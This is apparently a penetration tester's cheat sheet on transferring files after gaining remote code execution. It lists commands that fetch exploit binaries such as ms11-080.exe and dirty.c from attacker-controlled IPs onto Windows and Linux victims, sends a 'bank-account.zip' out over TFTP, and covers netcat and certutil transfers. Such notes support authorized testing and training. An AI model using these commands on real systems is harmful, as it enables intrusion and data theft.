# Serving up code
Once we have RCE, we can sometimes want to serve up files or code to download and execute
on the victim (e.g., webshell)

#### HTTP
```
sudo service apache2 start
/var/www/html
wget http://192.168.1.42/go.exe
```

#### SIMPLE HTTP
```python SimpleHTTPServer.py```

Will serve up on port 8000 in the folder you run the script from

#### TFTP
```
atftpd --daemon --port 69 /tftp

cd /tftp 
touch incoming 
chmod 777 incoming

tftp -i 10.11.0.185 GET test.txt
tftp -i 10.11.0.185 PUT bank-account.zip incoming
```

#### SMB
```
smbserver.py [sharename] /tmp/smbserve/
Dir \\192.168.1.48\sharename
\\192.168.1.48\sharename\go.exe
```





# File Transfer - Windows
``tftp -i 10.11.0.185 GET test.txt``

```cscript wget.vbs http://10.11.0.158/ms11-080.exe -O C:\lec\ms11-080.exe```
#### Powershell 2
```(new-object System.Net.WebClient).Downloadfile("http://10.11.0.185/accesschk.exe", "C:\lec\accesschk.exe")```

#### Powershell 3
```Invoke-WebRequest "http://10.11.0.130/adfsys.exe" -OutFile "adfsys.exe"```

#### SimpleSMBServer
```smbserver.py lecon /var/www/html```

#### SimpleHTTPServer
```python -m SimpleHTTPServer```

#### FTP


# Linux
```wget http://10.11.0.158/dirty.c -O /tmp/dirty.c```

```scp root@10.11.0.158:~/Downloads/dirty.c .```

#### netcat

```
nc -lnvp <LPORT> < <FILE>
nc <RHOST> <RPORT> > <FILE>
```








# Windows lolbins
[BitsAdmin ](https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/)

```certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>```
